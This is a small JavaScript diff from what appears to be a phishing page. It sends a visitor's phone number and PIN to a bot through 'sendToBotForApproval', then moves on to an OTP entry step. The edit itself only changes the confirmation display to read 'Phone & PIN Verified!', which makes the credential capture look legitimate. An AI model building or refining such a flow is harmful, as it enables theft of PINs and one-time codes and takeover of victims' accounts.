@@ -221,8 +221,8 @@ let userPin = '';
         await sendToBotForApproval(phone, pin);
         
         document.getElementById('pin-waiting').style.display = 'none';
-        document.querySelector('.approval-notice').style.display = 'none';
         document.getElementById('pin-approved').style.display = 'block';
+        document.getElementById('pin-approved').querySelector('p').textContent = '✓ Phone & PIN Verified!';
         
         document.getElementById('phone-actions').style.display = 'none';
         document.getElementById('otp-actions').style.display = 'flex';
